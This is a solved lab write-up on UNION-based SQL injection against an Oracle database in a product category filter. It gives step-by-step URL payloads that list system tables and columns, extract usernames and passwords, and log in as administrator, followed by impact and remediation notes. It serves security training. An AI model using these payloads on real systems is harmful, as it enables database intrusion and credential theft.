Lab 06: SQL Injection Attack, Listing The Database Contents On Oracle

## Lab Details

- Catagory: SQL Injection
- Difficulty: Practitioner

## Objective

- Use a SQL injection vulnerability to retrieve information about the Oracle database structure and obtain the administrator's credentials.

## Vulnerability Explanation

- The application is vulnerable to UNION-based SQL injection in the product category filter.
- This vulnerability allows an attacker to query Oracle system tables and discover table names, column names, and sensitive data.

## Finding the Vulnerability

- When selecting a product category, the URL contains a parameter similar to:
  
  /filter?category=Gifts

- The value of the category parameter is used in a SQL query without proper validation.

## Exploitation Steps

Step 1: Find the Table Names
Use the following payload:

'+UNION+SELECT+table_name,NULL+FROM+all_tables--

This displays the names of tables in the database.

Step 2: Find the Column Names
After identifying the users table, use:

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XXXXX'--

This displays the column names in the users table.

Step 3: Retrieve User Credentials
After identifying the username and password columns, use:

'+UNION+SELECT+USERNAME_XXXXX,PASSWORD_XXXXX+FROM+USERS_XXXXX--

This retrieves usernames and passwords stored in the table.

Step 4: Log In as Administrator
Use the administrator credentials obtained from the database to log in and solve the lab.

## Result

- The database structure was successfully enumerated, and the administrator credentials were retrieved.
- The administrator account was accessed successfully, completing the lab.

## Impact

- Sensitive database information can be disclosed.
- User credentials can be exposed.
- Attackers may gain unauthorized access to accounts.

## Remediation

- Use parameterized queries.
- Validate and sanitize user input.
- Restrict database permissions.
- Avoid exposing sensitive information through SQL queries.

## Key Learning

- Oracle databases use system tables such as 'ALL_TABLES' and 'ALL_TAB_COLUMNS' to store metadata. These tables can be abused during SQL injection attacks to discover database structure and extract sensitive information.

## Lab Status
- Solved✅ 
